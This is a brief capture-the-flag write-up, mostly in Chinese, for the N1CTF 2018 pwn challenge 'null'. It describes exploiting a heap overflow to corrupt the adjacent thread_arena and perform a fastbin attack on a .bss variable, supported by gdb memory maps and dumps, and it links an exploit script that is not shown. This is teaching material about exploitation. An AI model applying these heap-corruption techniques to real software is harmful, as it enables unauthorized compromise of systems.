# null

**Points:** 526
**Solves:** 19

>Check this out man! A "/dev/null" service online!
>
>[null](null) [libc.so.6](libc.so.6)


程序创建线程运行主要逻辑，存在堆溢出，但无法泄露任何信息，无法使用已知技术。

要利用成功需要理解 thread_arena 的细节，可查看 `sysmalloc` 和 `arena` 源码。

当 malloc 的内存达到一定量时，分配的堆块和 `thread_arena` 处于相邻状态。


```c
gdb-peda$ vmmap
Start              End                Perm	Name
0x00400000         0x00402000         r-xp	/home/gd/pwn/n1ctf2018/null/null
0x00601000         0x00602000         r--p	/home/gd/pwn/n1ctf2018/null/null
0x00602000         0x00603000         rw-p	/home/gd/pwn/n1ctf2018/null/null
0x02399000         0x023ba000         rw-p	[heap]
0x00007fa0a8000000 0x00007fa0b0000000 rw-p	mapped	-> we control
0x00007fa0b0000000 0x00007fa0b4000000 rw-p	mapped	-> thread_arena
0x00007fa0b7cd2000 0x00007fa0b7cd3000 ---p	mapped
0x00007fa0b7cd3000 0x00007fa0b84d3000 rw-p	mapped
...

```

通过溢出可以修改 `thread_arena` 实施 fastbin attack，目标为 `.bss` 上的变量：

```c
gdb-peda$ x/32xg 0x00007fa0b0000000
0x7fa0b0000000:	0x0000000000000000	0x0000000000000000
0x7fa0b0000010:	0x0000000000000000	0x0000000000000000
0x7fa0b0000020:	0x0000000000000000	0x0000000000000000
0x7fa0b0000030:	0x0000000000000000	0x0000000000000000
0x7fa0b0000040:	0x0000000000000000	0x0000000000000000
0x7fa0b0000050:	0x000000000060201d	0x0000000000000000
0x7fa0b0000060:	0x0000000000000000	0x0000000000000000
0x7fa0b0000070:	0x0000000000000000	0x00007fa0afffffe0
0x7fa0b0000080:	0x0000000000000000	0x00007fa0b0000078
0x7fa0b0000090:	0x00007fa0b0000078	0x00007fa0b0000088
...

```

[exp.py](exp.py)
